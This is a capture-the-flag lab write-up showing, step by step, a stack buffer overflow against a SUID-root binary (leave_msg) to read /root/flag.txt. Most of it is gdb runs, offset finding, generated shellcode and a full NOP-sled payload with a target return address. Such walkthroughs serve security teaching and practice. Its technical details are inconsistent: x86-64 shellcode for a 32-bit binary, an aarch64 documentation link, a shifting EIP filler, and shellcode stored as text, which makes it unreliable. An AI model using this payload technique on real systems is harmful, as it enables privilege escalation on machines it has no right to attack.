## Background: 

We've recycled a password to SSH into annother Linux machine during a pen test.

We login with a standard access account, htb-student. The program leave_msg allows us to leave a message for an admin.

We see that these messages are stored in "/htb-student/msg.txt," which is binary owned by the user root, and the SUID bit is set.

Let's see if we can exploit the program with Stack-Based Buffer Overflow to read the file "/root/flag.txt".


# Note:

We need to be aware that this server is using python2, so we may need to adjust our commands accordingly.

    python --version
    Python 2.7.17


# Inspect Binary:

Lets inspect the exe to see what we are working with:

    file leave_msg
    leave_msg: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8694607c1cba3fb3814a144fb014da53d3f3e49e, not stripped

The file is using 32-bit registers.


# Overflow:

Lets use gdb to test different payloads and see if we can break the program.

If the payload is sufficienly large we get:

    (gdb) r $(python -c "print('A'*3000)")
    Starting program: /home/htb-student/leave_msg $(python -c "print('A'*3000)")
    
    Program received signal SIGSEGV, Segmentation fault.
    0x41414141 in ?? ()

If we inspect the registers we see what caused the segfault:

    (gdb) info registers
    eax            0x0	0
    ecx            0x15	21
    edx            0x56558158	1448444248
    ebx            0x41414141	1094795585
    esp            0xffffc9c0	0xffffc9c0
    ebp            0x41414141	0x41414141
    esi            0xffffca00	-13824
    edi            0x0	0
    eip            0x41414141	0x41414141
    eflags         0x10282	[ SF IF RF ]
    cs             0x23	35
    ss             0x2b	43
    ds             0x2b	43
    es             0x2b	43
    fs             0x0	0
    gs             0x63	99

- We've overwritten EIP.

Now that we know we can overwrite the Instruction Pointer, lets see how many bytes it takes to reach EIP.

- To do this well adjust the payload to a "x" number of A characters, and 4 B characters.

        (gdb) r $(python -c "print('A'*2060+'B'*4)")
        Starting program: /home/htb-student/leave_msg $(python -c "print('A'*2060+'B'*4)")
        
        Program received signal SIGSEGV, Segmentation fault.
        0x42424242 in ?? ()

- Since the 32-bit register has been overwritten by 4 bytes of "42", we now know that we need to send 2060 bytes before we reach EIP.


# Stack Size:

To inspect the stack size we'll run:

    (gdb) info proc mappings
    process 2185
    Mapped address spaces:
    
    	Start Addr   End Addr       Size     Offset objfile
    	0x56555000 0x56556000     0x1000        0x0 /home/htb-student/leave_msg
    	0x56556000 0x56557000     0x1000        0x0 /home/htb-student/leave_msg
    	0x56557000 0x56558000     0x1000     0x1000 /home/htb-student/leave_msg
    	0x56558000 0x56579000    0x21000        0x0 [heap]
    	0xf7ded000 0xf7fbf000   0x1d2000        0x0 /lib32/libc-2.27.so
    	0xf7fbf000 0xf7fc0000     0x1000   0x1d2000 /lib32/libc-2.27.so
    	0xf7fc0000 0xf7fc2000     0x2000   0x1d2000 /lib32/libc-2.27.so
    	0xf7fc2000 0xf7fc3000     0x1000   0x1d4000 /lib32/libc-2.27.so
    	0xf7fc3000 0xf7fc6000     0x3000        0x0 
    	0xf7fcf000 0xf7fd1000     0x2000        0x0 
    	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
    	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
    	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
    	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
    	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
    	0xfffdc000 0xffffe000    0x22000        0x0 [stack]

The stack size is: 0x22000


# Read The Flag:

Now that we know how to set EIP, lets exploit the program to read a file with root privileges.

First lets start by generating shell code that can cat a file.

- We can use pwntools for this: https://docs.pwntools.com/en/stable/shellcraft/aarch64.html#pwnlib.shellcraft.aarch64.linux.cat

We'll need to make a flag to test the code:

    echo "HTB{f4lS3_fLag}" > flag.txt

Now use shellcodePwn.py to generatecode to read the file "flag.txt":

    ./Documents/Scripts/shellcode.py
    Shellcode contains N bytes: 44
    
    6a01fe0c2448b8666c61672e747874506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05

Next, we'll test it:

    ./shellcodeRun.py -s 6a01fe0c2448b8666c61672e747874506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05
    Shellcode Output:
    HTB{f4lS3_fLag}

Now that it works, update "shellcodePwn.py" to read "/root/flag.txt":

    ./Documents/Scripts/shellcode.py
    Shellcode contains N bytes: 64
    
    48b801010101010101015048b860662f75797501014831042448b82f726f6f742f666c506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05


Now that we've got a shellcode, lets craft a payload. Our requirements are:

- 2060 bytes + pointer to shellcode.
- 64 bytes (128 chars) for shellcode.
- Lets add 100 bytes of no operation instruction (NOPS)

         Buffer = "\x41" * (2060 - 100 - 128) = 1896
           NOPs = "\x90" * 100
      Shellcode = "48b8...0f05"
            EIP = "\x5a" * 4


After using the payload, lets find where the shellcode is in memory:

    (gdb) x/30xg $esp+2332
    0xffffd68c:	0x4141414141414141	0x4141414141414141
    0xffffd69c:	0x4141414141414141	0x4141414141414141
    0xffffd6ac:	0x4141414141414141	0x9090414141414141
    0xffffd6bc:	0x9090909090909090	0x9090909090909090
    0xffffd6cc:	0x9090909090909090	0x9090909090909090
    0xffffd6dc:	0x9090909090909090	0x9090909090909090
    0xffffd6ec:	0x9090909090909090	0x9090909090909090
    0xffffd6fc:	0x9090909090909090	0x9090909090909090
    0xffffd70c:	0x9090909090909090	0x9090909090909090
    0xffffd71c:	0x3130386238349090	0x3130313031303130
    0xffffd72c:	0x3035313031303130	0x3636303638623834
    0xffffd73c:	0x3537393735376632	0x3133383431303130
    0xffffd74c:	0x3862383434323430	0x6636663632376632
    0xffffd75c:	0x6336363666323437	0x3835323061363035
    0xffffd76c:	0x3133376539383834	0x3134353066303666

0xffffd71c


run $(python -c 'print "\x41"*1896 + "\x90"*100 + "H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8`f/uyu\x01\x01H1\x04$H\xb8/root/flPj\x02XH\x89\xe71\xf6\x0f\x05A\xba\xff\xff\xff\x7fH\x89\xc6j(Xj\x01_\x99\x0f\x05" + "\x66"*4')

    (gdb) x/30xg $esp+2332
    0xffffd68c:	0x4141414141414141	0x4141414141414141
    0xffffd69c:	0x4141414141414141	0x4141414141414141
    0xffffd6ac:	0x4141414141414141	0x4141414141414141
    0xffffd6bc:	0x4141414141414141	0x4141414141414141
    0xffffd6cc:	0x4141414141414141	0x4141414141414141
    0xffffd6dc:	0x4141414141414141	0x4141414141414141
    0xffffd6ec:	0x4141414141414141	0x9090414141414141
    0xffffd6fc:	0x9090909090909090	0x9090909090909090
    0xffffd70c:	0x9090909090909090	0x9090909090909090
    0xffffd71c:	0x9090909090909090	0x9090909090909090
    0xffffd72c:	0x9090909090909090	0x9090909090909090
    0xffffd73c:	0x9090909090909090	0x9090909090909090
    0xffffd74c:	0x9090909090909090	0x9090909090909090
    0xffffd75c:	0x01010101b8489090	0x60b8485001010101
    0xffffd76c:	0x4801017579752f66	0x6f722fb848240431

Now all we need to do is point EIP to: 0xffffd75c









